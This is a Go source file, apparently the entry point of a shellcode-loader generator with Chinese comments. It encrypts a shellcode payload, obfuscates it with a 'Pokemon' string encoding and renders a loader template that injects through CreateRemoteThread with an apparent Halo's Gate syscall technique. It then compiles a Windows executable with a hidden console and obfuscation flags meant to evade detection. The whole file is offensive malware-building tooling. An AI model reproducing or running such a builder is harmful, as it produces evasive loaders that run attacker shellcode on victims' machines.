package main

import (
	"fmt"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		FileName:  rand.RStrings(),
		Path:      "output",
		Key:       rand.LByteStrings(16),
		IV:        rand.LByteStrings(16),
	}
	// 加密之后的 shellcode
	payload, err := params.PokemonStrings(crypto.PokemonEncode) // 传入加密方法，根据加密方法的签名渲染模板
	if err != nil {
		log.Fatal(err)
	}

	loader := render.Loader{
		Method: "loader.CreateRemoteThreadHalos",
	}

	// 定义模板渲染数据
	data := render.Data{
		CipherText:    rand.RStrings(),
		PlainText:     rand.RStrings(),
		Pokemon:       payload,
		DecryptMethod: "crypto.PokemonDecode",
		Loader:        loader,
	}

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/v4/Base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: true,
		CompilePath: "output",
		BuildMode:   "pie",
		Literals:    true,
		GSeed:       true,
		Tiny:        true,
	}

	// 编译
	if err = cOpts.GoCompile(); err != nil {
		log.Fatal(err)
	}

}
